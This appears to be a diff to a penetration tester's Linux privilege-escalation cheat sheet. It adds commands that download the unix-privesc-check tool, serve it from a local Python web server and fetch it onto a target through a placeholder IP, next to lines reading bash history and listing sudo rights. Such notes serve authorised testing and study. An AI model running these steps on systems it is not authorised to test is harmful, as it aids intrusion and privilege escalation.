@@ -1,3 +1,7 @@
 cat .bash_history
 su - <user>
 sudo -l
+
+wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
+python -m SimpleHTTPServer 8000
+wget http://<ip>:8000/unix-privesc-check
